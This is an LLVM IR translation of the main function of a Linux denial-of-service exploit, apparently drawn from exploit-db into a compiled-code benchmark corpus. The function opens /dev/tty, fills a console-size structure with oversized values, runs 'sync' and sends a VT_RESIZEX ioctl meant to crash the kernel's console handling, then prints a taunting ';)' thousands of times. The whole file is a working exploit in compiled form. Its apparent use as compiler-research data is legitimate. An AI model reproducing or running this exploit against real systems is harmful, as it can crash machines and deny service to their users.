; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_690.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_690.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.vt_consize = type { i32, i32, i64, i64, i64 }

@.str = private unnamed_addr constant [9 x i8] c"/dev/tty\00", align 1
@O_RDWR = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [5 x i8] c"open\00", align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"sync\00", align 1
@VT_RESIZEX = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [6 x i8] c"ioctl\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c";)\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.vt_consize, align 8
  %8 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 4242, i32* %8, align 4
  %9 = load i32, i32* @O_RDWR, align 4
  %10 = call i32 @open(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str, i64 0, i64 0), i32 %9)
  store i32 %10, i32* %6, align 4
  %11 = load i32, i32* %6, align 4
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %13, label %15

13:                                               ; preds = %2
  %14 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  store i32 -42, i32* %3, align 4
  br label %39

15:                                               ; preds = %2
  %16 = call i32 @memset(%struct.vt_consize* %7, i32 0, i32 32)
  %17 = getelementptr inbounds %struct.vt_consize, %struct.vt_consize* %7, i32 0, i32 4
  store i64 0, i64* %17, align 8
  %18 = getelementptr inbounds %struct.vt_consize, %struct.vt_consize* %7, i32 0, i32 3
  store i64 0, i64* %18, align 8
  %19 = getelementptr inbounds %struct.vt_consize, %struct.vt_consize* %7, i32 0, i32 2
  store i64 0, i64* %19, align 8
  %20 = getelementptr inbounds %struct.vt_consize, %struct.vt_consize* %7, i32 0, i32 0
  store i32 65535, i32* %20, align 8
  %21 = getelementptr inbounds %struct.vt_consize, %struct.vt_consize* %7, i32 0, i32 1
  store i32 32769, i32* %21, align 4
  %22 = call i32 @system(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0))
  %23 = load i32, i32* %6, align 4
  %24 = load i32, i32* @VT_RESIZEX, align 4
  %25 = call i64 @ioctl(i32 %23, i32 %24, %struct.vt_consize* %7)
  %26 = icmp slt i64 %25, 0
  br i1 %26, label %27, label %29

27:                                               ; preds = %15
  %28 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0))
  store i32 -4242, i32* %3, align 4
  br label %39

29:                                               ; preds = %15
  br label %30

30:                                               ; preds = %34, %29
  %31 = load i32, i32* %8, align 4
  %32 = add nsw i32 %31, -1
  store i32 %32, i32* %8, align 4
  %33 = icmp ne i32 %31, 0
  br i1 %33, label %34, label %36

34:                                               ; preds = %30
  %35 = call i32 @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0))
  br label %30

36:                                               ; preds = %30
  %37 = load i32, i32* %6, align 4
  %38 = call i32 @close(i32 %37)
  store i32 42, i32* %3, align 4
  br label %39

39:                                               ; preds = %36, %27, %13
  %40 = load i32, i32* %3, align 4
  ret i32 %40
}

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @memset(%struct.vt_consize*, i32, i32) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i64 @ioctl(i32, i32, %struct.vt_consize*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
